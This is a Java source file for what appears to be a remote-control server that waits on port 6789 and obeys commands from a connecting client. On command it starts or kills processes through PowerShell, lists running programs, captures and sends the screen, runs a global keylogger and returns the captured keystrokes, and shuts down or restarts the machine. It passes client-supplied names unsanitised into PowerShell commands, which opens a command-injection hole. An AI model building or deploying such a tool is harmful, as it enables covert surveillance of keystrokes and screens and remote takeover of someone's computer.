import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;

import model.KeyLog;
import model.Server;
import model.*;

public class Main {
	private static KeyLog keyLog = new KeyLog();
	public static void main(String[] args) throws IOException {
		GlobalScreen.setEventDispatcher(new SwingDispatchService());
		int port = 6789;
		try {
            Server.server = new ServerSocket(port);
            Server.client = Server.server.accept();
            Server.in = new BufferedReader(new InputStreamReader(Server.client.getInputStream()));
            Server.out = new BufferedWriter(new OutputStreamWriter(Server.client.getOutputStream()));
        } catch (Exception e){
        	
        } 
		
		boolean isRunning = true;
		while (isRunning)
        {
			String msg = null;
			try {
				msg = Server.in.readLine();
				
				System.out.println("[server] receive: " + msg); // msg from client
				
				if(msg.equals("START_APP") || msg.equals("START_PROCESS")) Start();
				else if(msg.equals("STOP_APP") || msg.equals("STOP_PROCESS")) Stop();
				else if(msg.equals("LIST_APP")) List("APP");
				else if(msg.equals("LIST_PROCESS")) List("PROCESS");
				else if(msg.equals("DISCONNECT")) isRunning = false;
				else if(msg.equals("CAPTURE")) Capture();
				else if(msg.equals("HOOK")) Hook();
				else if(msg.equals("UNHOOK")) Unhook();
				else if(msg.equals("SHOW TEXT")) Showtext();
				else if(msg.equals("SHUTDOWN")) Shutdown();
				else if(msg.equals("RESTART")) Restart();
				else isRunning = false;
				
			} catch(Exception e1) {
				isRunning = false;
			}
        }
		
		try {
			Server.server.close();
			Server.client.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}
	
	// START ======================================================================================
	private static void Start() {
		String nameApp = null;
		try {
			nameApp = Server.in.readLine();
			try {
				Runtime.getRuntime().exec("powershell -command \"Start-Process " + nameApp);
				Server.out.write("Start " + nameApp);
				Server.out.newLine();
				Server.out.flush();
			} catch (Exception e) {
				e.printStackTrace();	
			}
		} catch(Exception e) {
		}
	}
	
	// STOP =======================================================================================
	private static void Stop() {
		String msg = null;
		try {
			msg = Server.in.readLine();
			
			try {
				long pid = Integer.parseInt(msg.toString());		
				Runtime.getRuntime().exec("powershell -command \"Stop-Process -ID " + pid + " -Force");
			} catch (Exception e) {
				Runtime.getRuntime().exec("powershell -command \"Stop-Process -name " + msg + " -Force");
			}
			
			Server.out.write("Stopped successfully!");
			Server.out.newLine();
			Server.out.flush();
			
		} catch(Exception e) {
		}
	}
	
	// Capture ===========================================
//	public static byte[] getScreen()
//	{
//	    BufferedImage imagebuf = null;
//	    try {
//	        imagebuf = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
//	    } catch (Exception e) {
//	        System.err.println("Can't get screen.");
//	        return null;
//	    }           
//
//	    ByteArrayOutputStream baos = new ByteArrayOutputStream();
//	    byte[] imageInByte;
//	    try {
//	        ImageIO.write(imagebuf, "jpg", baos);
//	        baos.flush();
//	    } catch (IOException e) {
//	        e.printStackTrace();
//	        return null;
//	    }
//	    finally {       
//	        imageInByte = baos.toByteArray();
//	        try {
//	            baos.close();
//	        } catch (IOException e) {
//	            e.printStackTrace();
//	        }
//	    }
//	    return imageInByte; 
//	}
	
	
	public static void Capture() {
		BufferedImage image = null;
	    try {
	        image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
	    } catch (Exception e) {
	        System.err.println("Can't get screen.");
	    }
	    try {
			ImageIO.write(image, "PNG", Server.client.getOutputStream());
		} catch (IOException e) {
			System.err.println("Can't send IMG.");
			e.printStackTrace();
		}
	}	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	// LIST =======================================================================================
	private static void List(String type) throws IOException, InterruptedException {
		Process process;
		
		if (type == "APP") 
			process = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Format-Table -HideTableHeaders  name, ID, {$_.Threads.Count}").start(); 
		else 
			process = new ProcessBuilder("powershell","\"gps| Format-Table -HideTableHeaders  name, ID, {$_.Threads.Count}").start(); 


		new Thread(() -> {
			Scanner sc = new Scanner(process.getInputStream());
			if (sc.hasNextLine()) sc.nextLine();
			while (sc.hasNextLine()) {
			    String info = sc.nextLine();
			    
			    if(info.length() == 0) continue;
			    	                
			    int pFirstSpace = info.indexOf(" ");
				int pLastSpace = info.lastIndexOf(" ") + 1;
				
				String name = info.substring(0, pFirstSpace);
				String ID = info.substring(pFirstSpace + 1, pLastSpace - 1);
				ID = ID.replaceAll("\\s", "");
				String count = info.substring(pLastSpace);
				//System.out.println(name + " " + ID + " " + count);
				try {
					Server.out.write(name);
					Server.out.newLine();
					Server.out.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				try {
					Server.out.write(ID);
					Server.out.newLine();
					Server.out.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				try {
					Server.out.write(count);
					Server.out.newLine();
					Server.out.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
			}
		}).start();   
	    process.waitFor();
		Server.out.write("Done");
   		Server.out.newLine();
   		Server.out.flush();
	}
	
	
	private static void Hook()
	{			
		keyLog.KeyLogger(keyLog);
		
	}
	
	private static void Unhook() {
		keyLog.UnKeyLogger(keyLog);
	}
	
	private static void Showtext() {
		try {
			Server.out.write(keyLog.keylog);
			Server.out.newLine();
			Server.out.flush();
			keyLog.keylog = "";
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
	}
	
	
	
	private static void Shutdown()
	{
		Runtime runtime = Runtime.getRuntime() ;
		try {
			Server.server.close();
			Server.client.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	    try
	    {
	       System.out.println("Shutting down the PC after 10 seconds.");
	       runtime.exec("shutdown -s -t 10");
	    }
	    catch(IOException e)
	    {
	       System.out.println("Exception: " +e);
	    }
	}
	
	
	
	
	
	private static void Restart() {
		Runtime runtime = Runtime.getRuntime() ;
		try {
			Server.server.close();
			Server.client.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	    try
	    {
	       System.out.println("Restarting the PC after 20 seconds.");
	       runtime.exec("shutdown -r -t 20");
	    }
	    catch(IOException e)
	    {
	       System.out.println("Exception: " +e);
	    }
	}
}
	

